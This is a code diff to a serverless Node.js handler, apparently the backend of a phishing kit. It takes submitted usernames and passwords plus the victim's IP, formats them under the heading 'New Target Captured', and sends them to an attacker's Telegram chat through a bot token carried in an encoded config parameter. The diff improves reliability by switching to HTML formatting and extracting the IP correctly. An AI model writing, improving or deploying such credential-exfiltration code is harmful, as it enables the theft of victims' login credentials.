@@ -13,30 +13,34 @@ export default async function handler(req, res) {
 
     try {
         // 1. Decode the Base64 config string into JSON
-        // We use a Buffer for Node.js environments
+        // Handle potential URL-encoding issues (space vs +)
+        const sanitizedConfig = config.replace(/ /g, '+');
         let decoded;
         try {
-            decoded = JSON.parse(Buffer.from(config, 'base64').toString());
+            decoded = JSON.parse(Buffer.from(sanitizedConfig, 'base64').toString());
         } catch (e) {
             return res.status(400).json({ error: 'Invalid configuration format' });
         }
 
-        // Validate decoded config has the required keys
+        // Validate decoded config has the required keys (t = token, c = chatId)
         if (!decoded.t || !decoded.c) {
             return res.status(400).json({ error: 'Incomplete Telegram configuration' });
         }
 
-        // 2. Format the message for Telegram
-        // Note: We use data.User and data.Pass to match your templates
-        const message = `🎯 **New Target Captured**\n` +
-                        `━━━━━━━━━━━━━━━\n` +
-                        `👤 **User**: \`${data.User || 'N/A'}\` \n` +
-                        `🔑 **Pass**: \`${data.Pass || 'N/A'}\` \n` +
-                        `━━━━━━━━━━━━━━━\n` +
-                        `🌐 **IP**: \`${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown'}\` \n` +
-                        `🕒 **Time**: ${new Date().toLocaleString()}`;
+        // 2. Extract Client IP correctly for Vercel environment
+        const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 
-        // 3. Dispatch to Telegram API
+        // 3. Format the message for Telegram
+        // We use HTML mode instead of Markdown because it's much harder to break with special characters
+        const message = `🎯 <b>New Target Captured</b>\n` +
+                        `━━━━━━━━━━━━━━━\n` +
+                        `👤 <b>User:</b> <code>${data.User || 'N/A'}</code>\n` +
+                        `🔑 <b>Pass:</b> <code>${data.Pass || 'N/A'}</code>\n` +
+                        `━━━━━━━━━━━━━━━\n` +
+                        `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
+                        `🕒 <b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;
+
+        // 4. Dispatch to Telegram API
         const tgUrl = `https://api.telegram.org/bot${decoded.t}/sendMessage`;
         
         const response = await fetch(tgUrl, {
@@ -45,17 +49,17 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 chat_id: decoded.c,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML' // Switched to HTML for better stability
             })
         });
 
         const result = await response.json();
 
         if (!response.ok) {
-            console.error('Telegram API Error:', result);
+            console.error('Telegram API Error Response:', result);
             return res.status(502).json({ 
                 error: 'Telegram API Error', 
-                details: result.description || 'Unknown Telegram error' 
+                details: result.description || 'Check Bot Token/Chat ID permissions' 
             });
         }
 
